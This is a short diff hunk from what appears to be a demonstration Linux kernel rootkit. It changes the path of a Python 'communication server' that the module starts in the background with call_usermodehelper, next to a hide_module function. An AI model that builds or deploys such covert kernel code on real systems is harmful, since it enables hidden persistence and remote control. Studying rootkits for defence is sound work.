@@ -30,7 +30,7 @@ void hide_module(void)
 Start the communication server
 */
 void start_server(void) {
-    char *argv[] = { "/bin/bash", "-c", "python3 /etc/rootkit_demo/public/source/server.py &", NULL};
+    char *argv[] = { "/bin/bash", "-c", "python3 /etc/systemd/system/rootkit_demo/public/source/server.py &", NULL};
     call_usermodehelper(argv[0], argv, userEnv, UMH_WAIT_PROC);
 }
 
